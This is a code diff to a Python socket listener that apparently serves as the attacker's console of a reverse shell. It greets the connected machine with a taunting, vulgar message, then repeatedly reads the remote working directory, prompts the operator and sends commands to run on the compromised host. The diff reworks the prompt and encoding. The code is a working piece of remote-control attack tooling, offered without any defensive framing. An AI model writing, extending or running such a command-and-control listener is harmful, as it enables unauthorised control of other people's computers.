@@ -16,20 +16,26 @@ client_socket , client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected")
 
 
-message = "Hello firend this is your fucker".encode()
+message = "Hello firend this is your fucker".encode("utf-8")
 
 client_socket.send(message)
 
 while True:
-    command = input("nfsh>>")
-    client_socket.send(command.encode())
-
-    if command.lower() == "exit":
-        break
+    shell = ''
     
-    results = client_socket.recv(BUFFER_SIZE).decode()
-    print(results)
+    results = client_socket.recv(BUFFER_SIZE).decode("utf-8")
+    if "cwd=" in results:
+        x = results.split("=")
+        shell = x[1]
+        command = input(f"{shell}>")
+        if command.lower() == "exit":
+            break
+        client_socket.send(command.encode("utf-8"))
+    else:
+        print(results)
 
 
 client_socket.close()
 s.close()
+
+
